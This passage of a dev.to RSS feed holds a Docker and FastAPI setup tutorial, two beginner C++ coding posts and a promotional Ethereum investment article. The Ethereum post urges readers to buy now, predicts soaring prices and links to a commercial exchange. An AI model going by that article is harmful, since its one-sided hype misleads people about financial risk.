            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;top&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;best&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>algorithms</category>
      <category>javascript</category>
      <category>java</category>
      <category>python</category>
    </item>
    <item>
      <title>Python development environment in a Docker container</title>
      <author>Mike</author>
      <pubDate>Sat, 05 Jun 2021 09:46:24 +0000</pubDate>
      <link>https://dev.to/mikecase/python-development-environment-in-a-docker-container-4hg8</link>
      <guid>https://dev.to/mikecase/python-development-environment-in-a-docker-container-4hg8</guid>
      <description>&lt;h2&gt;
  &lt;a href="#purpose"&gt;
  &lt;/a&gt;
  Purpose
&lt;/h2&gt;

&lt;p&gt;Create and setup a python development environment inside of docker in 5 minutes. (Also more or less a journal to myself of how to do this)&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-to-know"&gt;
  &lt;/a&gt;
  What to know
&lt;/h2&gt;

&lt;p&gt;You will need to understand virtual environments with python. I will place the commands that are needed for setting up the virtual environment but will not expand upon them. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-you-need"&gt;
  &lt;/a&gt;
  What you need
&lt;/h2&gt;

&lt;p&gt;Python 3.8 is the version I'll be using in this tutorial.&lt;br&gt;
Python modules you will need are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;fastapi&lt;/li&gt;
&lt;li&gt;hypercorn&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;a few files will need to be created.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;main.py&lt;/li&gt;
&lt;li&gt;Dockerfile&lt;/li&gt;
&lt;li&gt;.dockerignore&lt;/li&gt;
&lt;li&gt;docker-compose.yml&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following commands will install and create the files you need.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;touch &lt;/span&gt;main.py Dockerfile .dockerignore docker-compose.yml
pip &lt;span class="nb"&gt;install &lt;/span&gt;fastapi hypercorn
pip freeze &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; requirements.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-files"&gt;
  &lt;/a&gt;
  The files
&lt;/h2&gt;

&lt;p&gt;Now to modify the files you just created. Lets start with the fastapi application. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-raw-mainpy-endraw-"&gt;
  &lt;/a&gt;
  in &lt;code&gt;main.py&lt;/code&gt;:
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;FastAPI&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FastAPI&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;index&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;'key'&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;'value'&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above code sets up a very basic fastapi application. &lt;br&gt;
First you import FastAPI from fastapi&lt;br&gt;
next you instantiate the app.&lt;br&gt;
then you decorate your index with &lt;code&gt;@app.get('/')&lt;/code&gt;&lt;br&gt;
and finally you return a dictionary. &lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#next-in-raw-dockerfile-endraw-"&gt;
  &lt;/a&gt;
  Next in &lt;code&gt;Dockerfile&lt;/code&gt;:
&lt;/h2&gt;


&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; python:3.8-slim&lt;/span&gt;

&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /app/&lt;/span&gt;
&lt;span class="k"&gt;ADD&lt;/span&gt;&lt;span class="s"&gt; requirements.txt /app/&lt;/span&gt;

&lt;span class="k"&gt;RUN &lt;/span&gt;pip &lt;span class="nb"&gt;install&lt;/span&gt; &lt;span class="nt"&gt;-r&lt;/span&gt; requirements.txt

&lt;span class="k"&gt;ADD&lt;/span&gt;&lt;span class="s"&gt; . /app/&lt;/span&gt;

&lt;span class="k"&gt;EXPOSE&lt;/span&gt;&lt;span class="s"&gt; 8005&lt;/span&gt;

&lt;span class="k"&gt;CMD&lt;/span&gt;&lt;span class="s"&gt; ["hypercorn", "main:app", "--bind", "0.0.0.0:8000", "--reload"]&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;The above file creates a configuration for docker. It pulls a base image from the dockerhub. This uses &lt;code&gt;python:3.8-slim&lt;/code&gt; as the base image. Next we set our Work Directory to &lt;code&gt;/app/&lt;/code&gt; in the container. &lt;br&gt;
after that we add only our &lt;code&gt;requirements.txt&lt;/code&gt; to that app directory. then we can run pip install inside the container to install our app requirements, and setup our environment inside the container. After that we add the rest of our app to our &lt;code&gt;/app/&lt;/code&gt; directory on the container expose the port we want to be able to connect to this on and run hypercorn which was installed when we did &lt;code&gt;pip install -r requirements.txt&lt;/code&gt; &lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#now-for-raw-dockerignore-endraw-"&gt;
  &lt;/a&gt;
  Now for &lt;code&gt;.dockerignore&lt;/code&gt;:
&lt;/h2&gt;

&lt;p&gt;you don't have a need to include your .venv folder because you will be creating a virtual environment in the container. &lt;/p&gt;

&lt;p&gt;Also you don't need the pycache directories on the container(waste of space).&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;.venv/
__pycache__/
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#now-for-raw-dockercomposeyml-endraw-"&gt;
  &lt;/a&gt;
  Now for &lt;code&gt;docker-compose.yml&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;which will put it all together for us. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#note"&gt;
  &lt;/a&gt;
  Note:
&lt;/h2&gt;

&lt;p&gt;if you copy and paste and have issues with the .yml file you may need to check and see if the indentations are spaces or tabs. If they are tabs they will need to be converted to spaces. &lt;br&gt;
It's a yaml thing..&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;version&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;3.8'&lt;/span&gt;
&lt;span class="na"&gt;services&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;api&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="na"&gt;build&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;.&lt;/span&gt;
        &lt;span class="na"&gt;image&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;fastapiapp:latest&lt;/span&gt;
        &lt;span class="na"&gt;ports&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
            &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="s"&gt;8005:8000&lt;/span&gt;
        &lt;span class="na"&gt;volumes&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
            &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;bind&lt;/span&gt;
              &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;.&lt;/span&gt;
              &lt;span class="na"&gt;target&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;/app/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ok this is the last file. This file holds the container build/config instructions. It will also in this instance build the image for us. It will read the Dockerfile in the current working directory and build and app called &lt;code&gt;fastapiapp&lt;/code&gt; with the tag &lt;code&gt;latest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To run it all and see some progress, you should now be able to run &lt;code&gt;docker-compose buid &amp;amp;&amp;amp; docker-compose up -d&lt;/code&gt; and it should build and bring up your docker development environment. The first time it runs it may take a minute or to to come up, but after that it should be utilizing the build cache in docker to only rebuild/add the code that you modified. It will be accessable from &lt;a href="http://127.0.0.1:8005"&gt;127.0.0.1:8005&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I chose port 8005 because I have containers running on the previous 5 ports. You can use in the Dockerfile and docker-compose.yml file what ever port you'd like. The mapping of the ports is &lt;code&gt;hostport:containerport&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Bind mount volumes are used in this instance to allow you to modify the code in the current directory and it should also update in the container at the same time. The only time you will need to make a build is when/if you add new python modules. Because they will need to be recompiled and installed into the container. So also remember to run another &lt;code&gt;pip freeze &amp;gt; requirements.txt&lt;/code&gt; if you install new modules. &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A couple of helper scripts to make the process easier. &lt;br&gt;
&lt;code&gt;build.sh&lt;/code&gt;&lt;br&gt;
with the contents of:&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;docker build &lt;span class="nt"&gt;--pull&lt;/span&gt; &lt;span class="nt"&gt;--rm&lt;/span&gt; &lt;span class="nt"&gt;-f&lt;/span&gt; &lt;span class="s2"&gt;"Dockerfile"&lt;/span&gt; &lt;span class="nt"&gt;-t&lt;/span&gt; fastapiapp:latest &lt;span class="s2"&gt;"."&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;And a script for running the container in &lt;code&gt;up.sh&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;docker-compose &lt;span class="nt"&gt;-f&lt;/span&gt; &lt;span class="s2"&gt;"docker-compose.yml"&lt;/span&gt; up &lt;span class="nt"&gt;-d&lt;/span&gt; &lt;span class="nt"&gt;--build&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#things-to-check-when-it-all-goes-wrong"&gt;
  &lt;/a&gt;
  Things to check when it all goes wrong.
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Is port 8005 open on your firewall at least for the local connection? &lt;/li&gt;
&lt;li&gt;Is the container running? &lt;/li&gt;
&lt;li&gt;- &lt;code&gt;docker ps&lt;/code&gt; the image name should be &lt;code&gt;fastapiapp:latest&lt;/code&gt; if it is listed without running &lt;code&gt;docker ps -a&lt;/code&gt; then it is running.&lt;/li&gt;
&lt;li&gt;If it's not running you need to check the logs &lt;code&gt;docker logs -f container_name&lt;/code&gt; generally you can see the issue pretty clearly. &lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#github-repo"&gt;
  &lt;/a&gt;
  github repo
&lt;/h2&gt;

&lt;p&gt;All of the above mentioned files will be in a &lt;a href="https://github.com/MikeCase/fastapi-docker"&gt;repository&lt;/a&gt; on my github.&lt;/p&gt;

</description>
      <category>devops</category>
      <category>python</category>
      <category>fastapi</category>
      <category>docker</category>
    </item>
    <item>
      <title>Top 5 Reasons Why Ethereum Is Best Crypto for Investment</title>
      <author>saurabh</author>
      <pubDate>Sat, 05 Jun 2021 09:40:06 +0000</pubDate>
      <link>https://dev.to/saurabh88510696/top-5-reasons-why-ethereum-is-best-crypto-for-investment-275o</link>
      <guid>https://dev.to/saurabh88510696/top-5-reasons-why-ethereum-is-best-crypto-for-investment-275o</guid>
      <description>&lt;p&gt;Ethereum empowered the blockchain’s adoption that transcended beyond the exchange of value via Bitcoin by deploying decentralized solutions in process management.&lt;/p&gt;

&lt;p&gt;Whether it was to mitigate complex documentation in the maritime sector or making the supply chain future proof, smart-contracts powered by Ethereum Network have made operations simpler for businesses. One could well say the cliche “ good going Ethereum,” but was that enough? Perhaps, the potent of the Ethereum Network was yet to be explored that  DeFi or Decentralized Financing powered by Dapps brought it to the public after all. &lt;/p&gt;

&lt;p&gt;That said, a 400% to 2000% jump in Etherum rates that started with $1 in 2015 shouldn’t surprise you now. If you are new to the cryptocurrency space, it is the right time to buy Ethereum in India since the DeFi market is exploding post the release of over 200 successful projects. Here are five good reasons to visit cryptocurrency exchange in India and invest in Ethereum or ETH. Let’s deep dive without any further ado! &lt;/p&gt;

&lt;p&gt;Why Active and Passive Investors Must Consider Ethereum for Their Investment Portfolio in 2020?&lt;/p&gt;


&lt;h2&gt;A Potential Super World Computer&lt;/h2&gt; 

&lt;p&gt;Smart-contracts, if anyone asks why?  You can show them how Dapps have empowered the DeFi projects by bringing finance close to everyone without regulations using smart-contracts. The Dapps working on a secure Ethereum Network empower a host of functions from securing ownership and copyrights in ERC-777 Smart-Contracts to minting tokens powered by ERC-20 standards to acting like automated market makers. Using the Ethereum Network, a trustless, decentralized ecosystem can be established, which can help you to own properties, stocks, and valuables in other countries without going through a slew of compliances and regulations. The only requirement is a mobile phone and Internet connection to perform various operations from validating, listing to transferring value across the world. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Theory of Tokenization&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;At present, roughly 40 million people are aware of blockchain, its use cases in the form of digital assets. But in approximately five years down the line, blockchain is expected to grow at a CAGR or Compounded Annual Growth Rate of 67.3%, becoming a US$39.7 billion economy from US$3 billion at present. That being said, the theory of tokenization will be dominant, all-pervasive, and result-driven.&lt;br&gt;
 Even the World Economic Forum has vouched for blockchain technology where almost 10% of the Global GDP will be stored on DLT or Decentralized Ledger Technology. As a result, it is not far-fetched anticipation that tokenization  of everything will simplify operations and prevent economic loss.  Whether it is saving the rights of artists, bringing transparency in real-estate, or verifying education certificates, land records, or luxurious goods, everything will move towards blockchanization or the theory of tokenization. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Uncensored App Demand&lt;/b&gt; &lt;/p&gt;

&lt;p&gt;Most social media platforms and other forums are under the influence of the government or private players  to run their own agenda and hide things that do not fulfill their greater good. This doesn’t just happen at a macro level like countries but even by corporates to hide their public shaming issues. In countries like China, where most of the information has to pass through government filter, the deep inroads of decentralized ledger technology will help the public usher in the age of getting the right to be informed always.&lt;/p&gt;

&lt;p&gt;A lot of misconducts like sexual violence in college, university bad records are not made available to the public, blockchain platform powered by the Ethereum Network will pave the way for a trustless and censorless environment, where people will have the right to know everything and that can happen only when everything is stored in a trustless, decentralized ledger system, the best part is no one can shut it down to fulfill their own agenda. Therefore, individuals can extract necessary data as and when required to influence critical rationale to eliminate false agendas or bad influences tailored to serve vile purposes. While buying Ethereum from any cryptocurrency exchange in India, you will bolster the scope of further scalability of the network to grow and thrive, in the process, incentivizing you for your investments. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;A Greater Scope for Innovation&lt;/b&gt; &lt;/p&gt;

&lt;p&gt;Almost 1 billion people across the world are unbanked or face challenges to wire themselves to the banking network, their key obstacles: Regulations and stricter policies. Ethereum has almost brought a storm with the DeFi projects where anyone can participate in the banking system which is completely decentralized and get benefits of consistent return from the same. The same goes for registering art or minting tokens for value exchange. &lt;br&gt;
The scope has been broadening with the passage of time and the launch of Ethereum 2.0 which will further open the scope for innovation. Smart-contracts have completely simplified lending, borrowing, collateralization, derivative-trading, and other functions.  With the demand for  DeFi projects rising exponentially where the market cap rose from US$1 billion in April 2020 to US$15 billion in September, a span of just 5 months, it is hard to deny that more innovations likely in the future will drive the demand for the network and push the value of ETH in the near future to the sky. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Diversification of Application&lt;/b&gt; &lt;/p&gt;

&lt;p&gt;Bitcoin just remained as a currency for exchange, but Ethereum has gone past that via smart-contracts. With the power of smart-contracts, people have changed the question from “is it on the blockchain” to “why it is not on the blockchain.” That said, the scope for blockchain integration in various sectors has increased manifolds allowing better chances of the technology to evolve from early adoption to majority dominance. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Conclusion&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Ethereum’s persistent growth has brought economic incentivization to the community and with threats from alternative networks like Polkadot and Avalance, often hailed as “ETH killers”, this supercomputing network is expected to bring greater advancements, innovations, and scalability solutions to support and strengthen investment for the near future. Hence, buying Ethereum in India wouldn’t be a bad choice after all. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;read more to&lt;/b&gt; &lt;a href="https://www.pcexmember.in/buy-ethereum-online-india"&gt;Buy Ethereum in India&lt;/a&gt;&lt;/p&gt;

</description>
      <category>ethereum</category>
      <category>blockchain</category>
      <category>cryptocurrencyinvestment</category>
    </item>
    <item>
      <title>Find Largest and Smallest Element in an Array</title>
      <author>Mayank Pathak</author>
      <pubDate>Sat, 05 Jun 2021 09:09:02 +0000</pubDate>
      <link>https://dev.to/mayankpathak/find-largest-and-smallest-element-in-an-array-53fj</link>
      <guid>https://dev.to/mayankpathak/find-largest-and-smallest-element-in-an-array-53fj</guid>
      <description>&lt;p&gt;Hello guys👋, In this post we gonna check another most basic but most important programming problem in which we have to &lt;strong&gt;find the Largest and Smallest Element in an Array&lt;/strong&gt;. This problem❓ I solved when I was practicing✍ for the concept Array and thought🤔 that it will be useful if I share this problem with all those who are currently learning and practicing the Coding👨‍💻.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#problem-description"&gt;
  &lt;/a&gt;
  Problem Description
&lt;/h3&gt;

&lt;p&gt;Write a program to find the largest and smallest element in an array.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sample input:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;6&lt;/p&gt;

&lt;p&gt;20 25 100 95 45 5&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sample output:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The largest element in the array is : 100&lt;/p&gt;

&lt;p&gt;The smallest element in the array is : 5&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--pKgXfcEW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x1pjq1bcfw6h3aycpzdt.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--pKgXfcEW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x1pjq1bcfw6h3aycpzdt.png" alt="Largest and Smallest Element in an Array"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#procedure-to-follow-to-get-the-required-sets-of-result"&gt;
  &lt;/a&gt;
  Procedure to follow to get the required sets of result
&lt;/h3&gt;


&lt;ol&gt;

&lt;li&gt;Declare the required variables.&lt;/li&gt;


&lt;li&gt;Take the inputs form the user keyboard.&lt;/li&gt;


&lt;li&gt;Assign the max and to the initial or first element of the array.&lt;/li&gt;


&lt;pre class="highlight plaintext"&gt;&lt;code&gt;              i.e., max = min = a[0]
&lt;/code&gt;&lt;/pre&gt;



&lt;li&gt;If there is only one element present in the array then the loop did not execute and max, min hold the only present value in the array, thus that element becomes the both maximum and minimum.&lt;/li&gt;


&lt;li&gt;If array has more than one element, than loop executes and if any element found bigger than the previously assigned value, then that element becomes the largest.&lt;/li&gt;


&lt;pre class="highlight plaintext"&gt;&lt;code&gt;             i.e.,  if (a[i] &amp;gt; max )  then max = a[i]
&lt;/code&gt;&lt;/pre&gt;



&lt;li&gt;Similarly, if any element found smaller than the previously assigned value, than that element becomes the smallest.&lt;/li&gt;


&lt;pre class="highlight plaintext"&gt;&lt;code&gt;               i.e.,  if (a[i] &amp;lt; min )  then min = a[i]
&lt;/code&gt;&lt;/pre&gt;



&lt;li&gt;At last maximum and minimum elements are displayed as per the result output.&lt;/li&gt;
&lt;h3&gt;
  &lt;a href="#now-lets-come-to-the-coding-part-of-the-problem"&gt;
  &lt;/a&gt;
  Now let's come to the coding👨‍💻 part of the problem
&lt;/h3&gt;
&lt;h4&gt;
  &lt;a href="#code"&gt;
  &lt;/a&gt;
  Code
&lt;/h4&gt;


&lt;pre class="highlight plaintext"&gt;&lt;code&gt;
/*Code is written in C++ language*/
  #include &amp;lt;iostream&amp;gt;
  using namespace std;
  int main() {
    int n,min,max;
    cin&amp;gt;&amp;gt;n;
    int arr[n];
    for(int i=0;i&amp;lt;n;i++)
    {
        cin&amp;gt;&amp;gt;arr[i];
    }
    min=max=arr[0];
    for(int i=0;i&amp;lt;n;i++)
    {
        if(arr[i]&amp;lt;min)
        {
            min=arr[i];
        }
        if(arr[i]&amp;gt;max)
        {
            max=arr[i];
        }
     }
    cout&amp;lt;&amp;lt;"The largest element in the array is : "&amp;lt;&amp;lt;max;
    cout&amp;lt;&amp;lt;endl;
    cout&amp;lt;&amp;lt;"The smallest element in the array is : "&amp;lt;&amp;lt;min;
    return 0;
  }

&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;The same set of code is compiled on the online compiler to provide the outputs as per the condition asked in the problem.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Input test&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;pre class="highlight plaintext"&gt;&lt;code&gt;
6
20 25 100 95 45 5

&lt;/code&gt;&lt;/pre&gt;



&lt;p&gt;&lt;strong&gt;Output test&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;pre class="highlight plaintext"&gt;&lt;code&gt;
The largest element in the array is : 100
The smallest element in the array is : 5

&lt;/code&gt;&lt;/pre&gt;



&lt;p&gt;Hence with the required set of problem and its explaination we came across to know one of the important programming problem in Array and we can make the concept array strong with practicing such kinds of problem as much as we can.&lt;/p&gt;

&lt;p&gt;Hope with this you learned and acquired some basic knowledge and help you somewhat.&lt;/p&gt;

&lt;p&gt;Drop a Love❤ if you liked👍 this post, then share 🤝this with your friends and if anything is confusing or incorrect then let me know in the comment section.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#i-would-love-to-connect-with-you-all-twitter-linkedin"&gt;
  &lt;/a&gt;
  I would love to connect with you all &lt;a href="//twitter.com/mayankp4513"&gt;Twitter&lt;/a&gt; | &lt;a href="https://www.linkedin.com/in/mayank-pathak4513/"&gt;LinkedIn&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;If you find the post useful then consider &lt;strong&gt;&lt;a href="https://www.buymeacoffee.com/mayankpathak"&gt;Buying me a coffee&lt;/a&gt;☕&lt;/strong&gt;&lt;br&gt;
   &lt;a href="https://www.buymeacoffee.com/mayankpathak"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Rb9xKs4G--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks from my side, this is Mayank, keep learning and exploring !!&lt;/p&gt;

&lt;p&gt;Meet you in the next article......till than see ya🤚&lt;/p&gt;


&lt;/ol&gt;

</description>
      <category>codenewbie</category>
      <category>cpp</category>
      <category>programming</category>
      <category>computerscience</category>
    </item>
  </channel>
</rss>
